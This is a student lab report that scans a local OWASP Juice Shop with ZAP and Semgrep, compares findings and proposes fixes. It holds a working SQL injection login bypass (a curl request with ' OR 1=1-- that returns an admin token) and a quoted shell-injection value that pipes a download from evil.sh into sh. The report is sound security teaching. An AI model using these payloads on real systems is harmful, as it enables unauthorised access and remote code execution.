# Lab 5 — SAST and DAST: Reading the Code, Then Watching It Run

Tooling: ZAP `ghcr.io/zaproxy/zaproxy:stable` (3.6 GB image), `semgrep 1.x`, Docker 29.4.3.
Target: `bkimminich/juice-shop:v20.0.0` on the `lab5-net` Docker network; source cloned at tag `v20.0.0`.

Two environment deviations, both forced and both disclosed up front:

1. **Host port 3001, not 3000.** Port 3000 on this laptop is held by another project (`limactl`), so the container is published as `127.0.0.1:3001->3000/tcp`. ZAP reaches it as `http://juice-shop:3000` over the Docker network, so nothing about the scans changes; only my own `curl` checks use 3001.
2. **`zap-auth-lowmem.yaml` for the authenticated run.** Docker Desktop on this machine has 3.827 GiB for the whole VM. The stock `zap-auth.yaml` was OOM-killed (`exit 137`) four times — twice in `spiderAjax`, twice in `activeScan` — at 238 s, 130 s, 53 s and 51 s. The working copy changes three things and nothing else: `spiderAjax` uses `browserId: htmlunit` with one browser instead of a headless Firefox, `maxScanDurationInMins` drops from 10 to 4, and `maxRuleDurationInMins` from 2 to 1. The original file is untouched and still in the repository. The active scan therefore covers less than it would on a bigger machine, which I take into account below.

## Task 1

### Alert counts and durations

```bash
$ jq -r '[.site[].alerts[] | .riskdesc | split(" ")[0]] | group_by(.)
         | map({risk:.[0],n:length}) | .[] | "\(.risk)\t\(.n)"' labs/lab5/results/baseline-report.json
```

| Risk | Unauthenticated baseline | Authenticated full scan |
|---|---:|---:|
| **High** | **0** | **1** |
| Medium | 2 | 2 |
| Low | 5 | 1 |
| Informational | 3 | 4 |
| **Total alerts** | **10** | **8** |
| Unique URLs with findings | 17 | 10 |
| Duration | **55 s** | **283 s** (4 m 43 s) |

Baseline exit line: `FAIL-NEW: 0  WARN-NEW: 8  PASS: 59`, exit code 2 — non-zero because it found things, which is the documented behaviour.

### Which run reported more, and which found worse

**The baseline reported more alerts (10 vs 8). The authenticated run found the more serious one by a wide margin.**

The baseline's ceiling is Medium: `Content Security Policy (CSP) Header Not Set` and `Cross-Domain Misconfiguration` — both real (they match the missing CSP and the `Access-Control-Allow-Origin: *` I recorded in Lab 1), both header-level, neither exploitable on its own. Its other seven alerts are Low and Informational noise repeated across five URLs: missing COEP/COOP headers, a deprecated `Feature-Policy`, Unix timestamps in responses, cacheable content.

The authenticated run found **one High: SQL Injection on `POST /rest/user/login`, CWE-89**, and that single alert outweighs the other eighteen combined. The count went down because the passive baseline reports the same header issue once per URL it happens to see, while the active scan spent its budget attacking a smaller authenticated surface instead of re-reporting headers.

### Two alerts only the authenticated run found

| Alert | URL | Why an anonymous request could not reach it |
|---|---|---|
| **SQL Injection** (High, CWE-89) | `http://juice-shop:3000/rest/user/login` | The baseline is *passive*: it observes traffic and never sends an attack payload, so it cannot submit `email='` and see the 500. Reaching this alert requires actively POSTing a crafted JSON body to the login endpoint — the active scanner's job, not the spider's. |
| **Session Management Response Identified** | `http://juice-shop:3000/rest/user/login` | ZAP only classifies a response as session-management once it has seen a successful authentication exchange and the token that comes back. An anonymous crawl never submits credentials, so no such response ever exists in its traffic to classify. |

(`Authentication Request Identified` and `User Agent Fuzzer` are the other two authenticated-only alerts, both for the same reason: they need a login to have happened.)

### Why "number of alerts" is the wrong comparison

The two numbers here say the opposite of the truth: the scan that found a complete authentication bypass reported **fewer** alerts than the scan that found missing cache headers. Alert count measures how many URLs a passive rule happened to touch, not how much risk was discovered — one missing CSP header multiplied across five pages outscores one SQL injection five to one. What I would give a team lead is three lines instead: **highest risk found** (High, SQL injection on the login endpoint), **whether it is exploitable end to end** (yes — `' OR 1=1--` returns an admin JWT, shown below), and **what the scan could not see** (the active scan ran 4 minutes on this machine instead of 10, so absence of further Highs is not evidence of their absence).

For a pipeline whose only DAST step is `zap-baseline.py` against staging, the implication is uncomfortable: that pipeline would have been **green on the worst bug in this application**. The baseline reported zero High findings and never touched the login endpoint with a payload. A passive baseline is a useful, cheap regression check on headers and obvious misconfiguration, and it is not a vulnerability scan. Either add an authenticated active scan on a schedule (nightly, against a disposable environment, since active scanning writes data), or stop calling the baseline step a security gate.

## Task 2

### Severity split, rules and errors

```bash
$ jq '[.results[].extra.severity] | group_by(.) | map({severity: .[0], count: length})' \
    labs/lab5/results/semgrep.json
[{"severity":"ERROR","count":13},{"severity":"WARNING","count":14}]

$ jq '.errors | length' labs/lab5/results/semgrep.json
38
```

| Severity | Count |
|---|---:|
| ERROR | 13 |
| WARNING | 14 |
| **Total findings** | **27** |
| Scan errors | 38 |

The 38 errors are 16 syntax errors plus 22 partial-parsing events, and they are concentrated exactly where the spec says to expect them: `data/static/codefixes/*.ts` (the deliberately broken teaching snippets), plus a few Angular HTML templates and one workflow file. They do not invalidate the run, but they do mean those files were only partly analysed.

**Top rules by count:**

| n | Rule |
|--:|---|
| 6 | `javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection` |
| 5 | `yaml.github-actions.security.run-shell-injection.run-shell-injection` |
| 4 | `javascript.express.security.audit.express-check-directory-listing.express-check-directory-listing` |
| 4 | `javascript.express.security.audit.express-res-sendfile.express-res-sendfile` |
| 4 | `yaml.github-actions.security.github-actions-mutable-action-tag.github-actions-mutable-action-tag` |
| 1 | `javascript.express.security.audit.express-open-redirect.express-open-redirect` |
| 1 | `javascript.jsonwebtoken.security.jwt-hardcode.hardcoded-jwt-secret` |
| 1 | `javascript.lang.security.audit.code-string-concat.code-string-concat` |
| 1 | `yaml.github-actions.security.gha-curl-pipe-shell.gha-curl-pipe-shell` |

Filtering out `data/static/codefixes/` as the spec warns leaves 13 findings in real application code and workflows:

```
ERROR    code-string-concat            routes/userProfile.ts:61
ERROR    express-sequelize-injection   routes/login.ts:34
ERROR    express-sequelize-injection   routes/search.ts:23
WARNING  express-check-directory-listing  server.ts:269, 273, 277, 281
WARNING  express-open-redirect         routes/redirect.ts:19
WARNING  express-res-sendfile          routes/fileServer.ts:33, keyServer.ts:14,
                                       logfileServer.ts:14, quarantineServer.ts:14
WARNING  hardcoded-jwt-secret          lib/insecurity.ts:56
```

Four of the six `express-sequelize-injection` hits were teaching snippets; the two that survive the filter are the two that matter.

### A workflow rule, and Lecture 4

`yaml.github-actions.security.github-actions-mutable-action-tag` — four hits, including `.github/workflows/codeql-analysis.yml:23, 34, 36`:

```yaml
- name: Initialize CodeQL
  uses: github/codeql-action/init@v3
```

The rule objects to `@v3`: a Git tag is a mutable pointer, so whoever controls that repository can re-point `v3` at different code, and every workflow referencing it executes the new code on the next run — with whatever secrets and token permissions the job holds. This is Lecture 4's CI/CD-as-attackable-system argument in one line, and the `tj-actions/changed-files` compromise is the real-world version of it: a tag was moved, thousands of pipelines pulled the new commit, and secrets were printed into public logs. The fix is pinning by commit SHA, and Juice Shop's own repository already does it correctly elsewhere in the same files — `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 #v4.2.2`. It is also exactly the caveat the Lab 1 bonus spec made when it accepted a tag pin "in this first workflow".

### A finding I would suppress as a false positive

**File `.github/workflows/update-challenges-www.yml`, line 27, rule `yaml.github-actions.security.run-shell-injection.run-shell-injection`.**

```yaml
    - name: Update challenges.yml
      run: |
        if [ "${{ github.ref_name }}" = "master" ]; then
```

The rule is right in general: `${{ }}` interpolation into a `run:` block substitutes text *before* the shell parses it, so an attacker-controlled value containing `"; curl evil.sh | sh; #` executes as code. What makes it wrong **in this specific file** is the trigger block seven lines above it:

```yaml
on:
  push:
    branches: [ master, develop ]
```

plus `if: github.repository == 'juice-shop/juice-shop'` on the job. The workflow runs only on a push to `master` or `develop` in the upstream repository, so `github.ref_name` can hold exactly two literal values, `master` and `develop`, neither of which is attacker-controlled: creating a branch with a malicious name does not fire this workflow, and a fork's pushes fail the `if`. There is no path by which a hostile string reaches that interpolation. The generic Semgrep rule cannot see that constraint because it matches on the `run:` block without reading the trigger, which is the same "too wide to be useful here" failure I dealt with in Lab 3's gitleaks allowlist. I would suppress it with a `# nosemgrep: run-shell-injection` comment carrying that reasoning, not by disabling the rule repository-wide — the *other* four hits of the same rule still need review.

### One rule's worth of findings this sprint

**`express-sequelize-injection`** — the two surviving hits, `routes/login.ts:34` and `routes/search.ts:23`.

It is the only rule in the list that ZAP independently confirmed as exploitable against the running application, and the login one is a complete pre-authentication bypass that hands out an administrator token (evidence in the bonus section). Everything else on the list is either a weaker class or needs a precondition: the directory-listing and `sendFile` warnings expose files that are already intentionally public in this app, the open redirect needs a victim to click, and `hardcoded-jwt-secret` is severe but is a key-rotation project rather than a code fix. Two parameterised queries close a full authentication bypass and a data-extraction path in the product search. Two lines of code, the highest severity on the board, and a fix whose correctness is easy to review — that is the best return available this sprint.

## Bonus

### Correlation table

| OWASP Top 10:2025 | ZAP alert and URL | Semgrep rule and `file:line` |
|---|---|---|
| **A05 — Injection** | `SQL Injection` (High, CWE-89), `POST http://juice-shop:3000/rest/user/login`, param `email` | `express-sequelize-injection`, `routes/login.ts:34` |
| A05 — Injection | not reached by the 4-minute active scan | `express-sequelize-injection`, `routes/search.ts:23` |
| A02 — Security Misconfiguration | `Content Security Policy (CSP) Header Not Set` (Medium), `http://juice-shop:3000` | — (configuration, not source) |
| A02 — Security Misconfiguration | `Cross-Domain Misconfiguration` (Medium), `http://juice-shop:3000` | — |

### The strongest row, end to end

**Vulnerable source — `routes/login.ts:34`:**

```ts
models.sequelize.query(
  `SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,
  { model: UserModel, plain: true }
)
```

`req.body.email` is interpolated straight into the SQL string. The password is hashed first — which looks defensive and is irrelevant, because the injection happens before the `AND` ever matters.

**The request ZAP used** (from `auth-report.json`: `method: POST`, `param: email`, `attack: '`):

```bash
$ curl -s -o /dev/null -w "HTTP %{http_code}\n" -X POST http://127.0.0.1:3001/rest/user/login \
    -H 'Content-Type: application/json' -d '{"email":"'\''","password":"x"}'
HTTP 500
```

A single quote breaks the query and returns a 500 — that is the evidence ZAP recorded (`evidence: HTTP/1.1 500 Internal Server Error`). Turning the signal into the actual bug takes one more request:

```bash
$ curl -s -X POST http://127.0.0.1:3001/rest/user/login \
    -H 'Content-Type: application/json' -d '{"email":"'\'' OR 1=1--","password":"x"}'
HTTP 200
{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiw...
```

HTTP 200 with a signed JWT whose payload decodes to `"id":1, "email":"admin@juice-sh.op"` — no password, no account, full administrator session.

**The fix I would open a PR with** — parameter binding, so the value can never be parsed as SQL:

```ts
models.sequelize.query(
  'SELECT * FROM Users WHERE email = :email AND password = :password AND deletedAt IS NULL',
  {
    replacements: { email: req.body.email ?? '', password: security.hash(req.body.password ?? '') },
    model: UserModel,
    plain: true
  }
)
```

The same change applies to `routes/search.ts:23`, where `criteria` is interpolated into a `LIKE` clause — Semgrep flagged it, and the shortened active scan never got to `/rest/products/search`, which is itself a useful reminder that a clean DAST report is bounded by the scan's budget.

### What goes first in the PR description

The **`' OR 1=1--` request and the admin token it returns**, before any mention of source code. A reviewer who reads "SQL injection in `login.ts`" schedules it; a reviewer who sees a two-line `curl` that logs in as the administrator without a password merges it today. The Semgrep finding and the ZAP alert then belong immediately after, as the answer to "how do we know this is the only one and how will we know if it comes back" — the source line names the exact defect, and the two tools agreeing from opposite directions, one reading the code and one attacking the running app, is what makes the finding impossible to dismiss as a scanner artefact.
